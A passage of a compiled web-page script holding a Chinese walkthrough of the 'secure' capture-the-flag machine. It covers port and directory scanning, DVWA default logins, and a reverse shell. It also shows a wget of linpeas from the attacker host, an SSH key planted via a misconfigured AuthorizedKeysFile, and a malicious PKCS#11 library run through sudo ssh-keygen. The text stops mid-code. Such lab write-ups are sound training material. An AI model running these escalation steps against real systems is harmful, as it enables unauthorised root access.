(window.webpackJsonp=window.webpackJsonp||[]).push([[157],{520:function(s,a,t){"use strict";t.r(a);var e=t(11),n=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"存活主机发现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#存活主机发现"}},[s._v("#")]),s._v(" 存活主机发现")]),s._v(" "),a("p",[s._v("arp-scan 扫描局域网内存活主机：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/secure"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-I")]),s._v(" eth2 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.0/24\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.203   08:00:27:16:0b:23       PCS Systemtechnik GmbH\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("目标主机：192.168.6.203")]),s._v(" "),a("h2",{attrs:{id:"tcp端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#tcp端口扫描"}},[s._v("#")]),s._v(" TCP端口扫描")]),s._v(" "),a("p",[s._v("使用 nmap 进行 TCP 端口扫描：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/secure"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.203\n\nPORT   STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("目标主机开放了 22 和 80 端口。")]),s._v(" "),a("h2",{attrs:{id:"_80-端口服务探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口服务探测"}},[s._v("#")]),s._v(" 80 端口服务探测")]),s._v(" "),a("p",[s._v("访问 80 端口的 HTTP 服务，一个 SSH 介绍页面")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/1.png",alt:""}})]),s._v(" "),a("p",[s._v("dirsearch 扫描目录，部署了一个 DVWA 漏洞靶场，以及file.php 和 phpinfo.php 文件：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/secure"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ dirsearch "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://192.168.6.203\n\nTarget: http://192.168.6.203/\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(":44:31"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Starting: \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(":44:45"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("302")]),s._v(" -    0B  - /dvwa/  -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("  login.php\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(":44:46"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" -    7B  - /file.php\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(":44:53"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" -   23KB - /phpinfo.php\n\nTask Completed\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[s._v("gobuster 再扫一遍，尽可能多的收集信息：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/secure"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ gobuster "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://192.168.6.203/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-x")]),s._v(" php,html,txt,log,bak,zip\n\n/index.html           "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Status: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Size: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("11007")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n/file.php             "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Status: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Size: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n/cmd.php              "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Status: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Size: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n/phpinfo.php         "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Status: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Size: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23479")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("通过扫描目录，发现了 cmd.php 、file.php 、phpinfo.php 以及 DVWA 靶场，在 cmd.php 和 file.php 测试参数没有发现可以利用的可能，现在直接去 DVWA 靶机登录页面，默认用户名密码 admin/password 登录进去。")]),s._v(" "),a("h2",{attrs:{id:"命令执行-getshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#命令执行-getshell"}},[s._v("#")]),s._v(" 命令执行 Getshell")]),s._v(" "),a("p",[s._v("难度设置为 low ，方便直接利用")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/2.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/3.png",alt:""}})]),s._v(" "),a("p",[s._v("进入命令执行模块，反弹个shell 过来")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/4.png",alt:""}})]),s._v(" "),a("p",[s._v("稳定优化 shell")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/5.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("/usr/bin/script  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-qc")]),s._v(" /bin/bash /dev/null\n按下 ctrl z\nstty raw -echo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fg")]),s._v("  \n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("TERM")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("xterm  \n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("SHELL")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/bin/bash  \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"横向探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#横向探测"}},[s._v("#")]),s._v(" 横向探测")]),s._v(" "),a("p",[s._v("现在拿到了 www-data 权限的 shell ，下载 kali 上准备的 linpeas.sh 脚本到 /tmp 目录，扫描是否有提权点")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.101/linpeas.sh "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-O")]),s._v(" /tmp/linpeas.sh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("linpeas 扫描可能会卡在 cloud 模块，不清楚什么原因，使用 -o 参数跳过 cloud 模块就可以了，另外可以使用 -a 参数进行全面扫描，会尝试使用 su 命令登录其他用户，这个过程会使用空密码、用户名、top 2000 密码进行尝试。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/6.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("bash")]),s._v(" linpeas.sh "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-a")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("拿到了 lzh 用户的密码 hzl")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/7.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"ssh-配置变动发现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-配置变动发现"}},[s._v("#")]),s._v(" SSH 配置变动发现")]),s._v(" "),a("p",[s._v("查找近 7 天变化的文件，排除一些系统目录，减少噪音")]),s._v(" "),a("blockquote",[a("p",[s._v("说明：前一组括号是排除大目录，后一组括号是「最近 7 天内 mtime 或 ctime 变化的文件」，再 -print。")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /run "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /sys "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /proc "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /var/lib "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /dev "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /usr "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /var/log "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /var/cache "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-path")]),s._v(" /boot/grub "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-prune")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-mtime")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-7")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-ctime")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-7")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("检查到 ssh 配置文件存在变动，查看一下")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/8.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /etc/ssh/sshd_config\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("关键部分如下：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("PermitRootLogin no\nAuthorizedKeysFile      /tmp/authorized_keys2\nStrictModes no\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("不允许 root 登录，把公钥配置在了 /tmp/authorized_keys2 文件中，并且关闭了权限检查。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/9.png",alt:""}})]),s._v(" "),a("p",[a("code",[s._v("AuthorizedKeysFile /tmp/authorized_keys2")]),s._v(" 是一个全局配置，对所有用户生效；")]),s._v(" "),a("p",[s._v("因为 PermitRootLogin no，即使有公钥，也不能通过 SSH 登录 root；")]),s._v(" "),a("h2",{attrs:{id:"横向登录-one3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#横向登录-one3"}},[s._v("#")]),s._v(" 横向登录 one3")]),s._v(" "),a("p",[s._v("在 www-data 用户的 shell 里，在 /tmp 目录下创建 authorized_keys2 文件，写入自己的公钥")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqeBIA2vgVTkcqaBMVe7c7PL6S/FP+32ilrc8iUiVYc ssh-ed25519-2025120116260'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/authorized_keys2\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-secure/10.png",alt:""}})]),s._v(" "),a("p",[s._v("写入以后，kali 用户无法 SSH 连上来，排查发现当前的 /tmp 是 apache 服务的 PrivateTmp 目录，并非系统的 /tmp 目录")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("systemctl show apache2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" PrivateTmp\nsystemctl show "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" PrivateTmp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-secure/11.png",alt:""}})]),s._v(" "),a("p",[s._v("先尝试上线刚刚扫描出来的 lzh 用户，可以看 /tmp 目录下确实没有 www-data 用户创建的文件如linepeas.sh 和 authorized_keys2")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/12.png",alt:""}})]),s._v(" "),a("p",[s._v("使用 lzh 用户写入公钥，普通用户操作 /tmp 目录是没有问题的")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqeBIA2vgVTkcqaBMVe7c7PL6S/FP+32ilrc8iUiVYc ssh-ed25519-2025120116260'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/authorized_keys2\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-secure/13.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"ssh-登录-one3-用户"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-登录-one3-用户"}},[s._v("#")]),s._v(" SSH 登录 one3 用户")]),s._v(" "),a("p",[s._v("Kali 上线 one3 用户，sudo -l 显示 one3 用户可以以 root 身份、无需密码执行 /usr/bin/ssh-keygen")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-secure/14.png",alt:""}})]),s._v(" "),a("p",[s._v("Gtfobins 上查到 ssh-keygen 可以用来提权 "),a("a",{attrs:{href:"https://gtfobins.github.io/gtfobins/ssh-keygen/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://gtfobins.github.io/gtfobins/ssh-keygen/"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" ssh-keygen "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-D")]),s._v(" /tmp/lib.so\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"编写恶意-pkcs-11-库"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#编写恶意-pkcs-11-库"}},[s._v("#")]),s._v(" 编写恶意 PKCS#11 库")]),s._v(" "),a("p",[s._v("ssh-keygen 使用 -D 参数指定一个 PKCS#11 动态库，我们编写一个恶意的 PKCS#11 库，在库加载时执行提权操作，复制一个 SUID bash 到 /tmp 目录下。")]),s._v(" "),a("p",[s._v("准备 exp.c 文件")]),s._v(" "),a("div",{staticClass:"language-c line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// exp.c")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<stdlib.h>")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<string.h>")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<unistd.h>")])]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// PKCS#11 标准函数声明")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("typedef")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("struct")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("CK_FUNCTION_LIST")]),s._v(" CK_FUNCTION_LIST"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 恶意代码 - 在库加载时执行")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("__attribute__")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("constructor"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("pwn")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("geteuid")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 如果以root权限运行")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cp /bin/bash /tmp/bash"')]),a("span",{pre:!0,attrs:{class:"token 